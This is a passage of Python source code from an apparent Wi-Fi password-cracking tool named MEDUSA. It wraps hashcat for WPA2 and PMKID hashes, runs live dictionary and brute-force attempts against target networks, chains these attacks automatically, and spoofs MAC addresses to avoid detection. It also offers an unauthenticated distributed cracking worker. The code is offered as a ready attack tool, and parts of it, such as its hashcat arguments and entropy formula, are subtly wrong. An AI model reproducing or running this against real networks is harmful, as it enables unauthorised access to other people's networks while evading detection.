            timeout: Maximum runtime in seconds
        
        Returns:
            Cracked password string or None
        """
        hashcat = self.find_hashcat()
        if not hashcat:
            raise HashcatError("hashcat binary not found")
        
        with self._lock:
            self._stop_event.clear()
            self.current_speed = 0.0
            self.current_progress = 0.0
        
        # Build command
        cmd = [hashcat]
        
        # Mode
        cmd.extend(['-m', str(mode)])
        
        # Attack mode
        if attack_mode == 'dictionary':
            cmd.extend(['-a', '0'])
        elif attack_mode == 'mask':
            cmd.extend(['-a', '3'])
        elif attack_mode == 'hybrid_wordlist_mask':
            cmd.extend(['-a', '6'])
        elif attack_mode == 'hybrid_mask_wordlist':
            cmd.extend(['-a', '7'])
        else:
            cmd.extend(['-a', '0'])  # Default: dictionary
        
        # Output
        cmd.extend(['-o', str(TEMP_DIR / f"{session_name}_found.txt")])
        
        # Session
        cmd.extend(['--session', session_name])
        
        # Potfile
        pf = potfile_path or str(POTFILE_PATH)
        cmd.extend(['--potfile-path', pf])
        
        # Device selection
        if gpu_devices:
            cmd.extend(['-d', ','.join(str(d) for d in gpu_devices)])
        
        # Show only successful
        cmd.extend(['--show'])
        
        # Workload (low for undetectability, full for speed)
        cmd.extend(['-w', '3'])  # High performance
        
        # Status timer
        cmd.extend(['--status', '--status-timer', '1'])
        
        # Automatically detect backend
        cmd.extend(['--backend-devices', '1'])
        
        # Omit hashcat welcome
        cmd.extend(['--quiet'])
        
        # User arguments
        if extra_args:
            cmd.extend(extra_args)
        
        # Hash file
        cmd.append(hash_file)
        
        # Wordlist / mask
        if attack_mode in ('dictionary', 'rule', 'hybrid_wordlist_mask'):
            if wordlist:
                cmd.append(wordlist)
            else:
                cmd.append(str(DEFAULT_WORDLIST))
        
        if attack_mode in ('mask', 'hybrid_mask_wordlist', 'hybrid_wordlist_mask'):
            if mask:
                cmd.append(mask)
        
        # Rules
        if rules and attack_mode == 'rule':
            cmd.extend(['-r', rules])
        
        if self.console:
            self.console.info(f"Hashcat: {' '.join(cmd)}")
        
        # Run hashcat
        try:
            self._process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1,  # Line-buffered
            )
            
            # Monitor progress
            start_time = time.time()
            password_found = None
            
            stdout_thread = threading.Thread(
                target=self._monitor_stdout,
                args=(self._process.stdout,),
                daemon=True
            )
            stdout_thread.start()
            
            stderr_thread = threading.Thread(
                target=self._monitor_stderr,
                args=(self._process.stderr,),
                daemon=True
            )
            stderr_thread.start()
            
            # Wait for completion with timeout
            while time.time() - start_time < timeout:
                if self._stop_event.is_set():
                    self._process.terminate()
                    break
                
                ret = self._process.poll()
                if ret is not None:
                    break
                
                time.sleep(SUBPROCESS_POLL_INTERVAL)
            
            # Check if hashcat timed out
            if self._process.poll() is None:
                self._process.terminate()
                try:
                    self._process.wait(timeout=10)
                except subprocess.TimeoutExpired:
                    self._process.kill()
            
            # Read found password from output file
            found_file = TEMP_DIR / f"{session_name}_found.txt"
            if found_file.exists():
                try:
                    with open(found_file, 'r') as f:
                        content = f.read().strip()
                    if content:
                        # Parse hashcat output format: hash:password
                        lines = content.split('\n')
                        for line in lines:
                            if ':' in line:
                                parts = line.split(':')
                                password_found = parts[-1]
                                break
                            else:
                                password_found = line
                except (IOError, OSError):
                    pass
                
                # Cleanup
                try:
                    found_file.unlink()
                except OSError:
                    pass
            
            return password_found
            
        except FileNotFoundError:
            raise HashcatError(f"hashcat binary not found at: {hashcat}")
        except Exception as e:
            raise HashcatError(f"Hashcat execution failed: {e}")
        finally:
            self._process = None
    
    def _monitor_stdout(self, stream: Optional[io.TextIOBase]):
        """Monitor hashcat stdout for progress and results."""
        if not stream:
            return
        
        pattern_speed = re.compile(r'Speed\.#\d+.*:\s+([\d.]+)\s*([GMK]H/s)')
        pattern_progress = re.compile(r'Progress\.\.\.:\s+(\d+)/(\d+)')
        pattern_time = re.compile(r'Time\.\.\.\.\.:\s+(.+)$')
        pattern_cracked = re.compile(r'(\w{32,}):(.+)$')
        
        for line in stream:
            if self._stop_event.is_set():
                break
            
            # Parse speed
            m = pattern_speed.search(line)
            if m:
                try:
                    speed = float(m.group(1))
                    unit = m.group(2)
                    if unit == 'GH/s':
                        speed *= 1000
                    elif unit == 'MH/s':
                        pass
                    elif unit == 'KH/s':
                        speed /= 1000
                    self.current_speed = speed
                except ValueError:
                    pass
            
            # Parse progress
            m = pattern_progress.search(line)
            if m:
                try:
                    done = int(m.group(1))
                    total = int(m.group(2))
                    self.current_progress = (done / total * 100) if total > 0 else 0
                except (ValueError, ZeroDivisionError):
                    pass
            
            # Parse estimated time
            m = pattern_time.search(line)
            if m:
                self.estimated_time = m.group(1).strip()
            
            # Log to console
            if self.console and line.strip():
                self.console.debug(f"hashcat: {line.strip()}")
    
    def _monitor_stderr(self, stream: Optional[io.TextIOBase]):
        """Monitor hashcat stderr for warnings and errors."""
        if not stream:
            return
        
        for line in stream:
            if self._stop_event.is_set():
                break
            if self.console and line.strip():
                # Check for warnings and errors
                stripped = line.strip()
                if 'Error' in stripped or 'error' in stripped:
                    self.console.err(f"hashcat: {stripped}")
                elif 'Warning' in stripped or 'warning' in stripped:
                    self.console.warn(f"hashcat: {stripped}")
                else:
                    self.console.debug(f"hashcat: {stripped}")
    
    def stop(self):
        """Stop the current hashcat process."""
        with self._lock:
            self._stop_event.set()
            if self._process and self._process.poll() is None:
                try:
                    self._process.terminate()
                    self._process.wait(timeout=5)
                except Exception:
                    if self._process:
                        try:
                            self._process.kill()
                        except Exception:
                            pass
    
    def check_potfile(self, hash_value: str, mode: int = HASHCAT_MODE_WPA2) -> Optional[str]:
        """Check if a hash has already been cracked in the potfile.
        
        Args:
            hash_value: The hash string to look up
            mode: Hashcat mode number
        
        Returns:
            Password if found, None otherwise
        """
        if not POTFILE_PATH.exists():
            return None
        
        try:
            with open(POTFILE_PATH, 'r') as f:
                for line in f:
                    stripped = line.strip()
                    if stripped and hash_value in stripped:
                        parts = stripped.split(':')
                        if len(parts) >= 2:
                            return parts[-1]
        except (IOError, OSError):
            pass
        
        return None
    
    def benchmark(self, mode: int = HASHCAT_MODE_WPA2) -> Dict[str, Any]:
        """Run hashcat benchmark for a specific mode.
        
        Args:
            mode: Hashcat mode to benchmark
        
        Returns:
            Dict with speed, device info
        """
        hashcat = self.find_hashcat()
        if not hashcat:
            return {'error': 'hashcat not found'}
        
        try:
            result = subprocess.run(
                [hashcat, '-b', '--benchmark-all' if mode == 0 else '-m', str(mode)],
                capture_output=True, text=True, timeout=120
            )
            
            output = result.stdout + result.stderr
            speeds = []
            
            for line in output.split('\n'):
                if 'Speed' in line and 'H/s' in line:
                    speeds.append(line.strip())
            
            return {
                'mode': mode,
                'output': output[:500],
                'speeds': speeds,
                'version': self.get_version(),
            }
        except subprocess.TimeoutExpired:
            return {'error': 'Benchmark timed out (120s)'}
        except Exception as e:
            return {'error': str(e)}


# ============================================================================
# BRUTE FORCE ENGINE — MAIN CLASS
# ============================================================================

class BruteForceEngine:
    """MEDUSA's elite brute-force cracking engine.
    
    State-of-the-art multi-strategy password cracking with:
    - Dictionary attacks (live connection attempts)
    - Mask/charset brute-force attacks
    - Hashcat GPU-accelerated cracking pipeline
    - Markov chain probability-based candidate generation
    - Intelligent password mutation
    - Session save/resume (idempotent)
    - Distributed cracking support
    - MAC rotation for undetectability
    - Real-time progress monitoring
    - Potfile integration for instant reuse of known passwords
    
    Thread-safe: All public methods can be called from any thread.
    All long-running operations respect a stop event for clean cancellation.
    
    Usage:
        engine = BruteForceEngine()
        
        # Dictionary attack
        password = engine.dictionary_attack("MyWiFi", bssid="AA:BB:CC:DD:EE:FF")
        
        # Hashcat attack
        password = engine.hashcat_crack("capture.hc22000", hash_type=22000)
        
        # Full attack chain (auto-selects best method)
        password = engine.full_attack_chain(network, capture_result)
    """
    
    def __init__(self, console=None, config: Optional[BruteForceConfig] = None):
        """Initialize the brute-force engine.
        
        Args:
            console: Optional logger/console object
            config: Optional configuration (auto-detected if None)
        """
        self.console = console
        self.config = config or BruteForceConfig()
        
        # Sub-modules
        self._detector = PasswordDetector(console)
        self._hashcat = HashcatManager(console)
        self._wordlist_mgr = WordlistManager()
        self._mutator = PasswordMutator()
        self._mac_mgr = MACManager()
        self._iface_mgr = get_iface_manager()
        
        # Threading
        self._executor = ThreadPoolExecutor(
            max_workers=self.config.threads or DEFAULT_CRACK_WORKERS,
            thread_name_prefix='medusa-crack'
        )
        self._stop_event = threading.Event()
        self._lock = threading.Lock()
        
        # Progress tracking
        self._attempts = AtomicCounter()
        self._rate_tracker = AtomicRateTracker()
        self._start_time: float = 0.0
        self._status = CrackingStatus.IDLE
        
        # Results
        self._found_password: Optional[str] = None
        self._found_hashes: ResultCollector = ResultCollector()
        self._errors: List[str] = []
        
        # Session
        self._session: Optional[SessionState] = None
        self._last_checkpoint: float = 0.0
        self._resume_offset: int = 0
        
        # MAC rotation tracking
        self._mac_rotation_count = 0
        self._current_mac: Optional[str] = None
        self._interface: Optional[str] = None
        
        # Detection
        self._hashcat_available = self._hashcat.find_hashcat() is not None
        
        # Load potfile cache
        self._potfile: Dict[str, str] = self._load_potfile()
    
    def _log(self, msg: str, level: str = "info"):
        """Log through console if available."""
        if self.console:
            getattr(self.console, level, self.console.info)(f"[Cracker] {msg}")
        else:
            log_func = LOG_LEVELS.get(level, LOG_LEVELS.get('info'))
            print(f"[Cracker] [{level.upper()}] {msg}")
    
    # ====================================================================
    # POTFILE MANAGEMENT
    # ====================================================================
    
    def _load_potfile(self) -> Dict[str, str]:
        """Load cracked password cache from potfile.
        
        Returns:
            Dict mapping hash → password
        """
        cache = {}
        if POTFILE_PATH.exists():
            try:
                with open(POTFILE_PATH, 'r') as f:
                    for line in f:
                        stripped = line.strip()
                        if stripped and ':' in stripped:
                            parts = stripped.split(':')
                            if len(parts) >= 2:
                                cache[parts[0]] = parts[-1]
            except (IOError, OSError):
                pass
        return cache
    
    def _save_to_potfile(self, hash_value: str, password: str,
                         mode: int = HASHCAT_MODE_WPA2):
        """Save a cracked password to the potfile.
        
        Args:
            hash_value: The hash (or BSSID for live cracks)
            password: Discovered password
            mode: Hashcat mode
        """
        try:
            POTFILE_PATH.parent.mkdir(parents=True, exist_ok=True)
            with open(POTFILE_PATH, 'a') as f:
                f.write(f"{hash_value}:{password}\n")
            self._potfile[hash_value] = password
        except (IOError, OSError) as e:
            self._log(f"Failed to save potfile: {e}", "warn")
    
    def check_potfile(self, target_id: str) -> Optional[str]:
        """Check if a target has already been cracked.
        
        Args:
            target_id: BSSID or hash value
        
        Returns:
            Password if found, None otherwise
        """
        return self._potfile.get(target_id)
    
    # ====================================================================
    # SESSION MANAGEMENT
    # ====================================================================
    
    def save_session(self) -> Optional[Path]:
        """Save current cracking session state.
        
        Returns:
            Path to saved session file, or None
        """
        if not self._session:
            return None
        
        self._session.update()
        self._session.progress_current = self._attempts.value
        self._session.elapsed_seconds = time.time() - self._start_time if self._start_time > 0 else 0
        self._session.resume_offset = self._attempts.value + self._resume_offset
        
        # Include target info
        self._session.resume_data = {
            'interface': self._interface,
            'mac': self._current_mac,
            'method': self._status.value if self._status else 'unknown',
        }
        
        return self._session.save()
    
    def load_session(self, session_id: str) -> Optional[SessionState]:
        """Load a saved session for resume.
        
        Args:
            session_id: Session ID or path
        
        Returns:
            Loaded SessionState or None
        """
        # Check if it's a file path
        session_path = Path(session_id)
        if not session_path.exists():
            session_path = SESSION_DIR / f"{session_id}.json"
        
        if not session_path.exists():
            self._log(f"Session not found: {session_id}", "warn")
            return None
        
        try:
            session = SessionState.load(session_path)
            self._session = session
            self._resume_offset = session.resume_offset
            self._log(f"Loaded session {session.session_id[:8]}... "
                     f"(mode={session.mode}, progress={session.progress_percent:.1f}%)")
            return session
        except Exception as e:
            self._log(f"Failed to load session: {e}", "err")
            return None
    
    def _start_session(self, mode: str, target_bssid: str = "",
                       target_ssid: str = ""):
        """Initialize a new session.
        
        Args:
            mode: Operation mode
            target_bssid: Target BSSID
            target_ssid: Target SSID
        """
        self._session = SessionState(
            session_id=generate_session_id(),
            mode=mode,
            status="running",
            target_bssid=target_bssid,
            target_ssid=target_ssid,
        )
        self._start_time = time.time()
        self._last_checkpoint = time.time()
    
    def _checkpoint(self):
        """Save checkpoint if interval has elapsed."""
        now = time.time()
        if (self._attempts.value % CHECKPOINT_INTERVAL == 0 or
            now - self._last_checkpoint > CHECKPOINT_INTERVAL_TIME):
            self.save_session()
            self._last_checkpoint = now
    
    # ====================================================================
    # INTERFACE & MAC MANAGEMENT
    # ====================================================================
    
    def _setup_interface(self, interface: Optional[str] = None) -> Optional[str]:
        """Prepare network interface for cracking.
        
        Sets up MAC rotation if not already configured.
        
        Args:
            interface: Interface name (auto-detected if None)
        
        Returns:
            Interface name or None
        """
        if not interface:
            interface = self._iface_mgr.get_best_wireless()
        
        self._interface = interface
        
        # Save current MAC for rotation
        if interface:
            self._current_mac = self._mac_mgr.get_current_mac(interface)
        
        return interface
    
    def _rotate_mac(self) -> bool:
        """Rotate MAC address for undetectability.
        
        Returns:
            True if MAC was rotated
        """
        if not self._interface:
            return False
        
        try:
            new_mac = random_mac()
            self._mac_mgr.spoof_mac(self._interface, new_mac)
            self._current_mac = new_mac
            self._mac_rotation_count += 1
            self._log(f"MAC rotated to {new_mac} (rotation #{self._mac_rotation_count})", "debug")
            return True
        except Exception as e:
            self._log(f"MAC rotation failed: {e}", "warn")
            return False
    
    # ====================================================================
    # LIVE DICTIONARY ATTACK
    # ====================================================================
    
    def dictionary_attack(self, ssid: str, bssid: str = "",
                          wordlist: Optional[str] = None,
                          interface: Optional[str] = None,
                          max_attempts: int = 0,
                          use_mutations: bool = True) -> Optional[str]:
        """Perform live dictionary attack against a WiFi network.
        
        Multi-threaded with configurable worker count.
        Includes MAC rotation and timing jitter for stealth.
        Session save/resume support.
        
        Args:
            ssid: Target network SSID
            bssid: Target BSSID (for potfile lookup)
            wordlist: Path to wordlist (auto-discovered if None)
            interface: Network interface to use
            max_attempts: Maximum attempts (0 = unlimited)
            use_mutations: Enable password mutation engine
        
        Returns:
            Password string if found, None otherwise
        """
        # Check potfile first
        if bssid:
            cached = self.check_potfile(bssid)
            if cached:
                self._log(f"Password found in potfile: {cached}", "found")
                return cached
        
        # Setup
        interface = self._setup_interface(interface)
        self._start_session("dictionary", bssid, ssid)
        self._status = CrackingStatus.RUNNING
        self._stop_event.clear()
        
        # Find wordlist
        if not wordlist:
            discovered = self._wordlist_mgr.discover_wordlists()
            if discovered:
                wordlist = str(discovered[0])
                self._log(f"Using discovered wordlist: {wordlist}")
            else:
                # Create a minimal fallback
                wordlist = str(DEFAULT_WORDLIST)
        
        wordlist_path = Path(wordlist)
        if not wordlist_path.exists():
            raise WordlistError(f"Wordlist not found: {wordlist}")
        
        # Count lines for progress
        total_lines = WordlistManager.count_lines(wordlist_path)
        if self._session:
            self._session.progress_total = total_lines
            self._session.progress_current = self._resume_offset
        
        self._log(f"Starting dictionary attack: {ssid} ({human_number(total_lines)} passwords)")
        self._log(f"Wordlist: {wordlist_path.name} ({human_bytes(wordlist_path.stat().st_size)})")
        
        if self._resume_offset > 0:
            self._log(f"Resuming from offset: {human_number(self._resume_offset)}")
        
        found_password = None
        skipped_to_resume = self._resume_offset > 0
        
        try:
            # Stream passwords
            for i, password in enumerate(WordlistManager.stream_passwords(wordlist_path)):
                if self._stop_event.is_set():
                    self._status = CrackingStatus.CANCELLED
                    break
                
                # Skip to resume offset
                if skipped_to_resume:
                    if i < self._resume_offset:
                        self._attempts.increment()
                        continue
                    skipped_to_resume = False
                    self._log(f"Resumed at attempt {human_number(i)}")
                
                # Check max attempts
                if max_attempts > 0 and self._attempts.value >= max_attempts:
                    self._log(f"Reached max attempts ({human_number(max_attempts)})")
                    break
                
                # Periodic MAC rotation
                if self._attempts.value > 0 and self._attempts.value % MAC_ROTATION_INTERVAL == 0:
                    self._rotate_mac()
                
                # Try the password
                found_password = self._try_password_with_mutations(
                    ssid, password, bssid, interface, use_mutations
                )
                
                if found_password:
                    break
                
                # Checkpoint
                if i % CHECKPOINT_INTERVAL == 0:
                    self._checkpoint()
                
                # Update rate tracker
                self._rate_tracker.record()
            
        except KeyboardInterrupt:
            self._log("Cracking interrupted by user", "warn")
            self._status = CrackingStatus.CANCELLED
        except Exception as e:
            self._log(f"Dictionary attack error: {e}", "err")
        finally:
            # Save final state
            if found_password:
                self._status = CrackingStatus.PASSWORD_FOUND
                if bssid:
                    self._save_to_potfile(bssid, found_password)
                self._log(f"PASSWORD FOUND: {found_password}", "found")
            elif self._status == CrackingStatus.RUNNING:
                self._status = CrackingStatus.COMPLETED
                self._log("Dictionary attack completed — password not found", "info")
            
            self.save_session()
            self._log(f"Attempts: {human_number(self._attempts.value)} "
                     f"| Rate: {self._rate_tracker.rate:.0f} pwd/s "
                     f"| Time: {human_time(time.time() - self._start_time)}")
        
        return found_password

    def _try_password_with_mutations(self, ssid: str, password: str,
                                      bssid: Optional[str] = None,
                                      interface: Optional[str] = None,
                                      use_mutations: bool = True) -> Optional[str]:
        """Try a password and its mutations against a network.
        
        Args:
            ssid: Network SSID
            password: Base password candidate
            bssid: Optional BSSID
            interface: Network interface
            use_mutations: Enable mutation engine
        
        Returns:
            Working password if found, None otherwise
        """
        # Try the base password first
        if self._detector.try_password(ssid, password, bssid, interface):
            return password
        
        self._attempts.increment()
        
        # Try mutations
        if use_mutations:
            mutations = self._mutator.generate_mutations(password, max_mutations=20)
            for mutated in mutations:
                if mutated == password:
                    continue
                if self._stop_event.is_set():
                    return None
                
                self._rate_tracker.record()
                
                if self._detector.try_password(ssid, mutated, bssid, interface):
                    return mutated
                
                self._attempts.increment()
        
        return None

    # ====================================================================
    # MASK ATTACK
    # ====================================================================
    
    def mask_attack(self, ssid: str, bssid: str = "",
                    charset_config: Optional[Dict[str, Any]] = None,
                    min_length: int = 8, max_length: int = 12,
                    interface: Optional[str] = None,
                    max_attempts: int = 0,
                    threads: int = 0) -> Optional[str]:
        """Perform mask/charset brute-force attack.
        
        Multi-threaded iterator-based attack that tries all combinations
        from a character set within length bounds.
        
        Uses ThreadPoolExecutor for parallel attempt distribution.
        Supports session save/resume with offset tracking.
        
        Args:
            ssid: Target network SSID
            bssid: Target BSSID
            charset_config: Custom charset configuration
            min_length: Minimum password length
            max_length: Maximum password length
            interface: Network interface
            max_attempts: Maximum attempts (0 = unlimited)
            threads: Number of worker threads
        
        Returns:
            Password string if found, None otherwise
        """
        # Check potfile
        if bssid:
            cached = self.check_potfile(bssid)
            if cached:
                return cached
        
        # Setup
        interface = self._setup_interface(interface)
        self._start_session("mask", bssid, ssid)
        self._status = CrackingStatus.RUNNING
        self._stop_event.clear()
        
        # Build charset
        if charset_config:
            charset = charset_combine(**charset_config)
        else:
            charset = charset_combine(
                lowercase=True, uppercase=True, digits=True, special=False
            )
        
        # Calculate total combinations
        total = estimate_mask_space(charset, min_length, max_length)
        est_time = total / max(1, threads or DEFAULT_CRACK_WORKERS * 5)
        
        self._log(f"Starting mask attack: {ssid}")
        self._log(f"Charset: {len(charset)} chars | Length: {min_length}-{max_length}")
        self._log(f"Combinations: {human_number(total)} (~{human_time(est_time)})")
        
        if self._session:
            self._session.progress_total = total
        
        workers = threads or DEFAULT_CRACK_WORKERS
        found_password = None
        self._found_password = None
        
        try:
            # Distribute work across threads by chunking the password space
            chunk_size = max(1000, total // (workers * 10))
            
            with ThreadPoolExecutor(max_workers=workers) as executor:
                futures = {}
                
                for chunk_start in range(self._resume_offset, total, chunk_size):
                    if self._stop_event.is_set():
                        break
                    
                    chunk_end = min(chunk_start + chunk_size, total)
                    
                    future = executor.submit(
                        self._mask_worker,
                        ssid, charset, min_length, max_length,
                        chunk_start, chunk_end, bssid, interface
                    )
                    futures[future] = (chunk_start, chunk_end)
                
                # Monitor completion
                for future in as_completed(futures):
                    if self._stop_event.is_set():
                        break
                    
                    try:
                        result = future.result()
                        if result:
                            found_password = result
                            self._stop_event.set()
                            break
                    except Exception as e:
                        self._log(f"Worker error: {e}", "err")
                    
                    # Update progress
                    if self._session:
                        start, end = futures[future]
                        self._session.progress_current += (end - start)
                    
                    # Checkpoint
                    if self._attempts.value % CHECKPOINT_INTERVAL == 0:
                        self._checkpoint()
        
        except KeyboardInterrupt:
            self._status = CrackingStatus.CANCELLED
        except Exception as e:
            self._log(f"Mask attack error: {e}", "err")
        finally:
            if found_password:
                self._status = CrackingStatus.PASSWORD_FOUND
                if bssid:
                    self._save_to_potfile(bssid, found_password)
            elif self._status == CrackingStatus.RUNNING:
                self._status = CrackingStatus.COMPLETED
            
            self.save_session()
        
        return found_password

    def _mask_worker(self, ssid: str, charset: str, min_len: int, max_len: int,
                     start: int, end: int, bssid: Optional[str] = None,
                     interface: Optional[str] = None) -> Optional[str]:
        """Worker thread for mask attack — tries a chunk of the password space.
        
        Args:
            ssid: Network SSID
            charset: Character set
            min_len: Minimum length
            max_len: Maximum length
            start: Starting index in password space
            end: Ending index
            bssid: Target BSSID
            interface: Network interface
        
        Returns:
            Password if found, None otherwise
        """
        count = 0
        for password in generate_password_stream(charset, min_len, max_len, start):
            if count >= (end - start) or self._stop_event.is_set():
                break
            
            if self._detector.try_password(ssid, password, bssid, interface):
                return password
            
            self._attempts.increment()
            self._rate_tracker.record()
            count += 1
            
            # MAC rotation
            if self._attempts.value % MAC_ROTATION_INTERVAL == 0:
                try:
                    self._rotate_mac()
                except Exception:
                    pass
        
        return None

    # ====================================================================
    # FULL ATTACK CHAIN — Auto-selects best strategy
    # ====================================================================
    
    def full_attack_chain(self, network: WiFiNetwork,
                          capture_result: Optional[CaptureResult] = None,
                          wordlist: Optional[str] = None,
                          interface: Optional[str] = None,
                          timeout: int = 600) -> Optional[str]:
        """Execute the optimal attack chain against a target network.
        
        Automatically selects the best strategy based on:
        - Encryption type (WPA2, WPA3, WEP, OPEN)
        - Available attack vectors (hashcat, live crack, PMKID)
        - Capture results (handshake captured, PMKID available)
        - Platform capabilities (GPU, tools)
        - Network characteristics (WPS, clients present)
        
        Attack chain priority:
        1. PMKID hashcat (fastest, no client needed)
        2. Handshake hashcat (if capture available)
        3. Live dictionary attack (if interface available)
        4. Live mask attack (last resort)
        
        Args:
            network: Target WiFiNetwork object
            capture_result: Optional capture result with handshake/PMKID
            wordlist: Optional wordlist path
            interface: Optional interface name
            timeout: Total timeout in seconds
        
        Returns:
            Password string if found, None otherwise
        """
        self._log(f"=== FULL ATTACK CHAIN: {network.ssid} ===")
        self._log(f"BSSID: {network.bssid} | CH: {network.channel} | Enc: {network.network_type_label}")
        
        deadline = time.time() + timeout
        password = None
        
        # Check potfile first
        if network.bssid:
            password = self.check_potfile(network.bssid)
            if password:
                self._log(f"Password found in potfile: {password}", "found")
                return password
        
        # Strategy 1: PMKID hashcat (fastest — no client/AP interaction needed)
        if (capture_result and capture_result.pmkid_captured and
            capture_result.hashcat_ready and self._hashcat_available):
            self._log("Strategy 1: PMKID hashcat attack", "info")
            remaining = max(30, deadline - time.time())
            
            password = self.hashcat_crack(
                hash_file=capture_result.hashcat_file,
                hash_type=HASHCAT_MODE_PMKID,
                wordlist=wordlist,
                timeout=int(remaining),
                session_name=f"pmkid_{safe_filename(network.ssid)}"
            )
            
            if password:
                return password
        
        # Strategy 2: Handshake hashcat (if capture available)
        if (capture_result and capture_result.handshake_captured and
            capture_result.hashcat_ready and self._hashcat_available):
            self._log("Strategy 2: Handshake hashcat attack", "info")
            remaining = max(60, deadline - time.time())
            
            password = self.hashcat_crack(
                hash_file=capture_result.hashcat_file,
                hash_type=HASHCAT_MODE_WPA2,
                wordlist=wordlist,
                timeout=int(remaining),
                session_name=f"handshake_{safe_filename(network.ssid)}"
            )
            
            if password:
                return password
        
        # Strategy 3: Live dictionary attack
        if interface or self._iface_mgr.get_best_wireless():
            self._log("Strategy 3: Live dictionary attack", "info")
            remaining = max(120, deadline - time.time())
            
            password = self.dictionary_attack(
                ssid=network.ssid,
                bssid=network.bssid,
                wordlist=wordlist,
                interface=interface,
                max_attempts=int(remaining * 10),  # ~10 pwd/sec estimate
            )
            
            if password:
                return password
        
        # Strategy 4: Live mask attack (last resort — slowest)
        if interface or self._iface_mgr.get_best_wireless():
            self._log("Strategy 4: Mask attack (last resort)", "warn")
            remaining = max(60, deadline - time.time())
            
            password = self.mask_attack(
                ssid=network.ssid,
                bssid=network.bssid,
                min_length=8,
                max_length=10,
                interface=interface,
                threads=min(8, CPU_COUNT),
            )
            
            if password:
                return password
        
        self._log("All strategies exhausted — password not found", "warn")
        return None
    # ====================================================================
    # STATUS & CONTROL
    # ====================================================================
    
    def stop(self):
        """Stop all cracking operations — idempotent."""
        self._log("Stopping cracker...")
        self._stop_event.set()
        self._hashcat.stop()
        
        if self._status in (CrackingStatus.RUNNING, CrackingStatus.INITIALIZING):
            self._status = CrackingStatus.CANCELLED
        
        self.save_session()
        self._log("Cracker stopped")
    
    @property
    def status(self) -> CrackingStatus:
        return self._status
    
    @property
    def is_running(self) -> bool:
        return self._status == CrackingStatus.RUNNING
    
    @property
    def found_password(self) -> Optional[str]:
        return self._found_password
    
    @property
    def attempt_count(self) -> int:
        return self._attempts.value
    
    @property
    def current_rate(self) -> float:
        return self._rate_tracker.rate
    
    @property
    def elapsed_time(self) -> float:
        if self._start_time > 0:
            return time.time() - self._start_time
        return 0.0
    
    @property
    def estimated_remaining(self) -> str:
        if self._session and self._session.progress_total > 0:
            rate = max(1, self._rate_tracker.rate)
            remaining = (self._session.progress_total - self._attempts.value) / rate
            return human_time(remaining)
        return "Unknown"
    
    def get_progress(self) -> Dict[str, Any]:
        """Get a comprehensive progress snapshot."""
        return {
            'status': self._status.value if self._status else "idle",
            'attempts': self._attempts.value,
            'rate': f"{self._rate_tracker.rate:.1f}/s",
            'elapsed': human_time(self.elapsed_time),
            'remaining': self.estimated_remaining,
            'found': self._found_password is not None,
            'password': self._found_password or None,
            'hashcat_speed': f"{self._hashcat.current_speed:.1f} MH/s" if self._hashcat.current_speed else "N/A",
            'hashcat_progress': f"{self._hashcat.current_progress:.1f}%",
        }
    
    # ====================================================================
    # DISTRIBUTED CRACKING (Worker Protocol)
    # ====================================================================
    
    def start_distributed_worker(self, host: str = '0.0.0.0', port: int = 6789,
                                 max_workers: int = 4):
        """Start a distributed cracking worker node.
        
        Listens for work assignments from a coordinator.
        Workers receive password ranges, crack locally, report results.
        
        Args:
            host: Bind address
            port: TCP port
            max_workers: Max concurrent crack threads
        """
        import socket as sock
        import json
        
        server = sock.socket(sock.AF_INET, sock.SOCK_STREAM)
        server.setsockopt(sock.SOL_SOCKET, sock.SO_REUSEADDR, 1)
        server.bind((host, port))
        server.listen(max_workers)
        
        self._log(f"Distributed worker listening on {host}:{port}")
        
        def handle_client(conn, addr):
            self._log(f"Connection from {addr}")
            try:
                while not self._stop_event.is_set():
                    data = conn.recv(65536)
                    if not data:
                        break
                    
                    work = json.loads(data.decode())
                    ssid = work.get('ssid')
                    charset = work.get('charset')
                    start = work.get('start', 0)
                    end = work.get('end', 0)
                    min_len = work.get('min_len', 8)
                    max_len = work.get('max_len', 12)
                    
                    for pwd in generate_password_stream(charset, min_len, max_len, start):
                        if self._stop_event.is_set():
                            break
                        if self._detector.try_password(ssid, pwd):
                            conn.send(json.dumps({'found': pwd}).encode())
                            return
                    
                    conn.send(json.dumps({'done': True}).encode())
                    
            except Exception as e:
                self._log(f"Worker client error: {e}", "err")
            finally:
                conn.close()
        
        while not self._stop_event.is_set():
            try:
                server.settimeout(1.0)
                conn, addr = server.accept()
                threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()
            except sock.timeout:
                continue
            except Exception as e:
                self._log(f"Server error: {e}", "err")
    
    # ====================================================================
    # UTILITY METHODS
    # ====================================================================
    
    def benchmark(self, quick: bool = True) -> Dict[str, Any]:
        """Benchmark cracking performance.
        
        Args:
            quick: Quick benchmark (few seconds) vs full
        
        Returns:
            Dict with performance metrics
        """
        results = {
            'system': SYSTEM,
            'cpu_count': CPU_COUNT,
            'hashcat_available': self._hashcat_available,
        }
        
        # Test network connection speed
        if quick:
            self._log("Running quick benchmark...")
            start = time.time()
            count = 0
            
            # Simulate connection attempts (don't actually connect)
            for _ in range(50):
                time.sleep(0.005)  # Simulated attempt time
                count += 1
            
            elapsed = time.time() - start
            results['simulated_rate'] = count / elapsed
            results['estimated_live_rate'] = count / elapsed * 0.5  # ~50% overhead
        
        # Hashcat benchmark
        if self._hashcat_available:
            self._log("Running hashcat benchmark (may take a moment)...")
            hc_results = self._hashcat.benchmark(HASHCAT_MODE_WPA2)
            results['hashcat'] = hc_results
        
        # Device info
        if self._hashcat_available:
            devices = self._hashcat.detect_devices()
            results['devices'] = devices
        
        return results
    
    def analyze_password(self, password: str) -> Dict[str, Any]:
        """Analyze a password for strength and patterns.
        
        Args:
            password: Password to analyze
        
        Returns:
            Dict with analysis metrics
        """
        if not password:
            return {'length': 0, 'quality': 'empty'}
        
        length = len(password)
        quality = PasswordQuality.assess(password)
        
        has_upper = any(c.isupper() for c in password)
        has_lower = any(c.islower() for c in password)
        has_digit = any(c.isdigit() for c in password)
        has_special = any(not c.isalnum() for c in password)
        
        # Calculate entropy
        pool = 0
        if has_lower: pool += 26
        if has_upper: pool += 26
        if has_digit: pool += 10
        if has_special: pool += 33
        
        entropy = length * (pool.bit_length() if pool > 0 else 1)
        crack_time = (pool ** length) / (1000000 * 3600 * 24)  # Days at 1M/s
        
        return {
            'password': password,
            'length': length,
            'quality': quality.value,
            'has_upper': has_upper,
            'has_lower': has_lower,
            'has_digit': has_digit,
            'has_special': has_special,
            'character_pool': pool,
            'entropy_bits': entropy,
            'estimated_crack_days': crack_time,
            'mutations': len(self._mutator.generate_mutations(password)),
        }
    
